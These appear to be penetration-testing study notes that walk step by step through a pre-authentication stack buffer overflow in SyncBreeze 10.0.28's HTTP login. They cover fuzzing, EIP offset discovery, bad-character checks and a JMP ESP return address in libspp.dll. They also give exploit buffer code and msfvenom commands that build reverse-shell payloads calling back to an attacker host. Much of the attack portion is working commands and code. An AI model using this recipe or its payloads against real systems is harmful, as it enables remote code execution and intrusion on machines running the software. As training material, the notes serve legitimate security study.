

Must discover vulnerability within a code (without access to its source)  
Much more difficult if code's compiled with [EIP control protections](Control%20Protections.md)  
	DEP, ASLR, CFG, SafeSEH  
Create our input in a way to gain conrtol of critical (EIP) registers  
Manipulate memory to gain reliable RCE  
  
  
3 Primary techniques for ID'ing flaws in apps:  
- Source code review  
- Reverse Engineering  
- Fuzzing (Entering in various input to see how an app will handle unexpected/ malformed data and how it might crash)  
		If an app crashes due to malformed input data, it may indicate the presence of a potentially exploitable vuln.  
  
  
<u>**NOTE: Use python2**</u>
  
Python3 can cause issues with extra bytes and whatnot.  

  
<u>Syntax differences:</u>
**Python2**:  
- #!/usr/bin/env python2.7  
- print “”  
- send(buffer)  
  
**Python3:**  
- #!/usr/bin/python  
- print ("")  
- send(buffer.encode())  
  
  

### Debugger used:

[Immunity Debugger](Immunity%20Debugger.md)  
  
  
### Setup:
In 2017, a bufferoverflow vulnerability was discovered in the login mechanism of SyncBreeze version 10.0.28.  
Specifically, the username field of the HTTP POST login request could be used to crash the application.  
Since working credentials are not required to trigger the vulnerability, it is considered a pre-authentication buffer overflow.  
  
- services.msc > find SyncBreeze Enterprise > Rt-click Start  
*As SyncBreeze runs w/ admin priv, start Immunity Debugger w/ admin priv  
  
- Attach Immunity Debugger to SyncBreeze app, click Run  
  
- Open Wireshark & FF on Kali > attempt login w/in SyncBreeze (Win addr port 80) > look for POST w/in net traffic > Rt-click Follow > TCP Stream  
*The data sent in the request will be used to craft our exploit  
  
  
  
### Fuzzing:
**Generation-based:** Creates malformed application inputsfrom scratch, following things like file format or network protocol specifications.  
  
**Mutation-based:** Changes existing inputs by using techniques like bit-flipping to create a malformed variant of the original input  
  
**Smart:** Aware of the application input format  
  
  
  
### Process:
##### fuzz
1. First, **fuzz** the username field by crafting a python script to send increasingly large data.  
	- Once an Access Violation is triggered w/in Immunity Debugger, you have an idea how large the byte size of your payload must be.  
```bash
size = 100  
  
while (size < 2000):  
...  
size += 100
```
```bash
Sending 800 bytes  
Cannot connect!
```

##### replicate
2. Replicate the crash by duplicating the fuzzer and replacing the size of the data.  
	- If the replaced size causes the same crash, you've got the rough size to work with  
```bash
size = 800  
  
inputBuffer = "A" * size
```

##### eip
3. Find EIP as you need to know exactly where the EIP register gets overwritten:  
	- Create a randomized pattern to find exactly where EIP is (sub size discovered during fuzzing & confirmed during replication) & sub in script
```
bash
msf-pattern_create -l 800
```
```bash
#size = 800  
  
inputBuffer = "kajfweb4ua80r9svfuogFJKLANSDf;F/KN.........
```
	
 - Once new exploit's run again, use the distinct value that EIP contains to then find the exact offset of the EIP register & test to verify: EIP should hold the 4 B's::: 42424242  
```bash
msf-pattern_offset -l 800 -q 42306142  
[*] Exact match at offset 780
```
```bash
filler = "A" * 780  
eip = "B" * 4  
buff = "C" * 20  
  
inputBuffer = filler + eip + buff
```

- the **buff** can be very useful in determining where the ESP register is compared to the EIP register.  
- In this case, there is a 4 byte space between the EIP (at 01AE7454) and the ESP (at 01AE745C). This will be our **offset**:
![[ID_registers.png]]

##### locate space
4. Locate space for the shellcode.  
	- As a reverse shell payload ~350-400 bytes, we'll need to adjust the **buff** to be large enough to contain it.  
```bash
filler = "A" * 780  
eip = "B" * 4  
offset = "C" * 4  
buff = "D" * (1500 - len(filler) - len(eip) - len(offset))  
  
inputBuffer = filler + eip + offset + buff
```
	- Once run, the ESP should be pointing to the first start of the “D”s  

##### bad chars
5. Check for bad characters as some apps, vulns, and protocols may not allow certain chars (like x00) and will end the operation we're exploiting truncating the buffer w/ our payload  
	- Replace the buffer with all possible hex characters from x00 to xFF  
		- \*\*\*As this is a POST request exploit, we must remove the x0D (return char) or x0A (line feed) which will otherwise end the HTTP field  
	- Once run, in Immunity Debugger, we can Rt-click the ESP > Follow in Dump to look for anything off  
	- May need to replace bad characters with good ones and re-run multiple times until we discover all the bad chars to stay away from.  
  
*****NOTE:** As python3 is a bit funky w/ sending hex characters, you will need to use a python2 version of the script.  
Change to **#!/usr/bin/env python2.7**    Remove **.encode** from **send(buff.encode())**   & any **print()** to **print “”**   then run as  **./script**  

##### return address
6. Find a **Return Address**. This address will be stored in **EIP** and point to the shellcode within the **ESP** buffer  
  
******NOTE: Use python2 as python3 will throw in an extra C2 byte******  
  
1) Leverage a **JMP** instruction  
	- Jumps to the address pointed to by **ESP** when it executes. Needs to be static.  
		- Many Windows support libraries contain **JMP**, however:  
			- Addresses used in the library must be static (eliminates those compiled w/ ASLR support)  
			- Addresses must NOT contain any bad chars that'd break the exploit (as it's part of our **inputBuffer**)  
  
-  **[mona.py](mona.py.md)** w/ in Immunity Debugger can request info on all DLLs or modules loaded by the app into the process' memory space  
	- Assuming there are no [memory controls](Control%20Protections.md) in place, the executable will always reliably load at the same address.  
		- Bottom of Immunity Debugger:
```bash
!mona modules
```

- Can see that the app (**syncbrs.exe**) has [memory protections](PWK--Strat--10_Buffer_Overflows--11_Windows_BO--Control_Protections.html) disabled. So, it'll always reliably load at the same address. (base address of 0x004xxxxx contains nulls, so isn't suitable)  
	- If the app is compiled w/ DEP support, the **JMP ESP** would have to be located in the **.text** code segment of the module, as that's the only segment w/ both **r** & **x** perms  
- Next DLL w/ all flags set to False - **libspp.dll** (address from 0x10 - 0x10223000) works.  
- Find opcode for **JMP ESP** use [msf-nasm_shell](PWK--Tools--msf--msf-nasm_shell.html):
```bash
msf-nasm_shell  
nasm > jmp esp  
00000000  FFE5       jmp esp
```

- Look for the #JMPESP within the dll in Immunity Debugger:
```bash
!mona find -s "\xff\xe4" -m "libspp.dll"
```

- To view address in Disassembler window while app is paused - Click Goto
![[GoToAddrDiss.png]]
 
Address In Dissasembler button and enter address found from above step.  
- If we redirect EIP to this address at the time of the crash, the **JMP ESP** instruction will be executed which will move the execution flow into our shellcode (the buffer contined in **ESP**)  
- Rewrite exploit to point **EIP** to return address. ******NOTE: Use python2 as python3 will throw in an extra C2 byte******  
```bash
filler = "A" * 780  
eip = "\x83\x0c\x09\x10"  
offset = "C" * 4  
buffer = "D" * (1500 -len(filler) - len(eip) - len(offset))
```

\*\*NOTE:\*\* As it's little endian, you MUST enter in address in reverse byte order <------ acutal address found: **0x10090c83**  
  
##### shellcode gen
7. Generate shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
	**-p** - Specify payload;
	**LHOST** - Local Host;
	**LPORT** - Local Port;
	**-f** - Specify format;
	**-e** - Specify encoding;
	**-b** Specify bad characters
	**shikata_ga_nai** - Adv polymorphic encoder

(for simple exe rev shell on Win:)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o /tmp/<evil.exe>
```
  
##### nop sled
8. Add nop sled - Due to [GetPC](GetPC.md) routine overwriting a small portion of the ESP register, craft a nop sled before shellcode.  
- The de-encoding of the shellcode (**shikata_ga_nai** ^) uses a few bytes on the stack prior to the payload (& therefore overwrites our input)  
- Add ~ 10 **\x90**s  
```bash
filler = "A" * 780  
eip = "\x83\x0c\x09\x10"  
offset ="C" * 4  
nops = "\x90" * 10  
shellcode = (.....  
  
inputBuffer = filler + eip + offset + nops + shellcode
```

	As we generated an encoded shellcode using msfvenom, the shellcode is not directly executable and is therefore prepended by a decoder stub.  
	In order to perform this task, the decoder needs to gather its address in memory and from there, look a few bytes ahead to locate the encoded shellcode that it needs to decode.  
	As with other GetPC routines, those used by _shikata_ga_nai_ have an unfortunate side-effect of writing some data at and around the top of the stack.  
	This eventually mangles at least a couple of bytes close to the address pointed at by the ESP register - hence a need for the **nop sled**